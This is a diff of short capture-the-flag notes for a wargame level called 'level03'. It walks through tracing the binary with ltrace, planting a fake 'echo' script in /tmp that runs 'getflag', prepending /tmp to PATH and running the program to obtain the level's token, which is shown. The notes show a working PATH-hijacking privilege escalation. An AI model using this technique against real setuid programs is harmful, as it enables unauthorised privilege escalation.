@@ -1,12 +1,11 @@
-strace ./level03
-ltrace ./level03
+🔻 Analyze
+⬇️ ltrace ./level03
+👉 system("/usr/bin/env echo
 
 
-nano /tmp/echo
-chmod +x /tmp/echo
-
-
-export PATH="/tmp:$PATH"
-
-
-qi0maab88jeaj46qoumi7maus
+🔻 Hack
+⬇️ echo -e '#!/usr/bin/env python\nimport os\nos.system("getflag")' > /tmp/echo
+⬇️ chmod +x /tmp/echo
+⬇️ export PATH="/tmp:$PATH"
+⬇️ ./level03
+👉 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
